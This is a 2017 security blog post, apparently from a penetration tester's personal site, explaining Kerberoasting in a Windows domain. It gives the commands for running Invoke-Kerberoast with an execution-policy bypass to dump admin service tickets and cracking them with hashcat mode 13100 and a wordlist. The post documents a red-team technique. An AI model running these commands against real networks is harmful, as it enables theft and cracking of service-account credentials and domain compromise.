<!DOCTYPE HTML><html><head><title>Hackallthethings.xyz</title><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /><link rel="stylesheet" href="/assets/css/main.css" /><link href="/assets/css/syntax.css" rel="stylesheet" /></head><body class="is-preload"><div id="header"><div class="top"><div id="logo"> <span class="image avatar48"><img src="/assets/images/avatar.jpg" alt="" /></span><h1 id="title">Hland</h1><p></p></div><nav id="nav"><ul><li><a href="/" id="top-link"><span class="icon fa-user">whoami</span></a></li><li><a href="/library"><span class="icon fa-book">Library</span></a></li><li><a href="/weblog"><span class="icon fa-rss">Weblog</span></a></li></ul></nav></div><div class="bottom"><ul class="icons"><li><a href="https://twitter.com/vladthegad" target="_blank" _rel="noreferrer noopen" class="icon fa-twitter"><span class="label">Twitter</span></a></li><li><a href="https://lmgtfy.com/?q=Privacy+is+not+dead" target="_blank" _rel="noreferrer noopen" class="icon fa-facebook"><span class="label">Facebook</span></a></li><li><a href="https://hackerone.com/hland" target="_blank" _rel="noreferrer noopen" class="icon"><span class="label">HackerOne</span></a></li></ul></div></div><section id="weblog" class="two"><div class="container"><header><h2>Springtime Kerberoasting</h2><p>Writtten by Hland on May 15, 2017</p></header><section class="post"><p>After getting some motivation from recent talks I attended I have decided to do some Kerberoasting in our Windows domain.</p><p>There are lots of excellent articles out there such as Harmj0y’s <a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">article</a>. In there you can find a bunch of references to other good and original articles on the subject. <br>The reason I’m writing this blog post is that there are lots of tools out there and some require specific versions of John the Ripper and so on so I decided to document one path that I have taken here.</p><p>First, on a domain joined Windows computer run the following script by Harmj0y: <br><a href="https://gist.github.com/HarmJ0y/53a837fce877e32e18d78acbb08c8fe9">https://gist.github.com/HarmJ0y/53a837fce877e32e18d78acbb08c8fe9</a></p><pre class="prettyprint"><code class=" hljs vala">powershell -exec bypass<br /><br /><span class="hljs-preprocessor"># Load the script</span><br />. ./Invoke-Kerberoast.ps1<br /><br /><span class="hljs-preprocessor"># Do a test run to see </span><br /><span class="hljs-preprocessor"># that it's working</span><br />Invoke-Kerberoast | fl <br /><br /><span class="hljs-preprocessor"># Get the tickets in John</span><br /><span class="hljs-preprocessor"># format and convert to CSV format</span><br />Invoke-Kerberoast -AdminCount -OutputFormat john | ConvertTo-Csv -NoTypeInformation | out-file kerbe<br />roasts.csv</code></pre><p>The next step is to start cracking the tickets in Kirbi format that we obtained. We can use either John The Ripper or Hashcat. I decided on Hashcat as this can make use of the GPU with oclHashcat.</p><pre class="prettyprint"><code class=" hljs lasso">hashcat <span class="hljs-attribute">-a3</span> <span class="hljs-attribute">-m</span> <span class="hljs-number">13100</span> service_tickets_hashcat<span class="hljs-built_in">.</span>txt rockyou<span class="hljs-built_in">.</span>txt<br />hashcat <span class="hljs-attribute">-a3</span> <span class="hljs-attribute">-m</span> <span class="hljs-number">13100</span> service_tickets_hashcat<span class="hljs-built_in">.</span>txt <span class="hljs-subst">--</span>show</code></pre><p>Another option for doing this on a red team engagement is to use Powershell Empire’s module for it <code>powershell/credentials/invoke-kerberoast</code>.</p><h3 id="other-tools-and-resources">Other tools and resources</h3><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> <br><a href="https://room362.com/post/2016/kerberoast-pt1/">https://room362.com/post/2016/kerberoast-pt1/</a> <br><a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a></p></section></div></section><script src="/assets/js/jquery.min.js"></script> <script src="/assets/js/jquery.scrolly.min.js"></script> <script src="/assets/js/jquery.scrollex.min.js"></script> <script src="/assets/js/browser.min.js"></script> <script src="/assets/js/breakpoints.min.js"></script> <script src="/assets/js/util.js"></script> <script src="/assets/js/main.js"></script></body></html>
